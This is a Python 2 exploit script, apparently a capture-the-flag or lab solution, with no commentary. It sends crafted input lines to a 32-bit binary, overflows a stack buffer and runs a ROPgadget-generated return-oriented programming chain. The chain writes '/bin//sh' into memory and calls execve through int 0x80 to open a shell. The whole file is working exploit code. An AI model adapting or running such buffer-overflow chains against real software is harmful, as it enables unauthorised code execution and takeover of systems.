#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = "rajiv\n"
p += "city1\n"
p += "1/1/111111"
p += "\x01"

p += 'a'*16
p += pack('<I', 0x08048e82)
p += "\n"

p += 'a'*36

p += pack('<I', 0x08048e82) # pop eax ; ret
p += pack('<I', 0x0804b074) # @ .data
p += pack('<I', 0x08048f26) # pop ebx ; ret
p += '/bin'
p += pack('<I', 0x08048e7f) # mov dword ptr [eax], ebx ; pop ebx ; pop eax ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08048e82) # pop eax ; ret
p += pack('<I', 0x0804b078) # @ .data + 4
p += pack('<I', 0x08048f26) # pop ebx ; ret
p += '//sh'
p += pack('<I', 0x08048e7f) # mov dword ptr [eax], ebx ; pop ebx ; pop eax ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08048e82) # pop eax ; ret
p += pack('<I', 0x0804b07c) # @ .data + 8
p += pack('<I', 0x08048e67) # xor ebx, ebx ; ret
p += pack('<I', 0x08048e7f) # mov dword ptr [eax], ebx ; pop ebx ; pop eax ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08048f26) # pop ebx ; ret
p += pack('<I', 0x0804b074) # @ .data
p += pack('<I', 0x08048e9d) # pop ecx ; ret
p += pack('<I', 0x0804b07c) # @ .data + 8
p += pack('<I', 0x08048e71) # pop edx ; ret
p += pack('<I', 0x0804b07c) # @ .data + 8
p += pack('<I', 0x08048e6a) # xor eax, eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e6d) # inc eax ; ret
p += pack('<I', 0x08048e73) # int 0x80


print p


